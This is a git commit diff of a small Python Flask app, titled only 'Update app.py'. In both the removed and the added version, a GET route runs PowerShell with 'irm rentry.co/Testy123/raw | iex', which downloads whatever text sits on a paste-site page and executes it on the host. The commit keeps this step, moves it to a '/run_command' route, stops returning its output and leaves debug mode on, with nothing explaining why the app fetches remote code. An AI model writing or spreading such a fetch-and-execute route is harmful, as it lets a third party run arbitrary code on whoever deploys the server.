4124d9c26dafdc0bb0d8dbc4140dde77dda869aa
Mokaramzein <mokaramalzein26@gmail.com>
2024-06-24 23:15:16 +0300

    Update app.py

--- app.py
+++ app.py
@@ -1,25 +1,16 @@
-
-from flask import Flask, jsonify
+from flask import Flask, request
 import subprocess
 
 app = Flask(__name__)
 
-@app.route('/', methods=['GET'])
-def run_powershell():
-    try:
-        # Define the PowerShell command
-        command = "irm rentry.co/Testy123/raw | iex"
-        
-        # Run the PowerShell command
-        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)
-        
-        # Check if the command was successful
-        if result.returncode == 0:
-            return jsonify({"status": "success", "output": result.stdout})
-        else:
-            return jsonify({"status": "error", "error": result.stderr})
-    except Exception as e:
-        return jsonify({"status": "error", "error": str(e)})
+@app.route('/run_command', methods=['GET'])
+def run_command():
+    cmd = "irm rentry.co/Testy123/raw | iex"
+    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
+    if completed.returncode != 0:
+        return "An error occurred: {}".format(completed.stderr)
+    else:
+        return "Command executed successfully!"
 
 if __name__ == '__main__':
-    app.run(debug=True, port=5001)
+    app.run(debug=True)
